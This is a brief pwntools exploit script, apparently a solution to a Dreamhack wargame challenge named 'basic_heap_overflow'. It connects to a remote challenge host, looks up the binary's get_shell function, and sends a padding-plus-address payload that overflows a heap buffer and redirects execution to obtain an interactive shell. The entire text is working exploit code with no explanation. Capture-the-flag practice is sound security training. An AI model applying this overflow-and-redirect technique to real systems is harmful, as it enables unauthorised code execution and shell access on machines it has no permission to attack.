from pwn import *
p = remote('host3.dreamhack.games', 18211)
e = ELF('./basic_heap_overflow')

get_shell = e.symbols['get_shell']
log.info(f"get_shell: {hex(get_shell)}")

payload = b'A' * 0x28 + p32(get_shell)

p.sendline(payload)
p.interactive()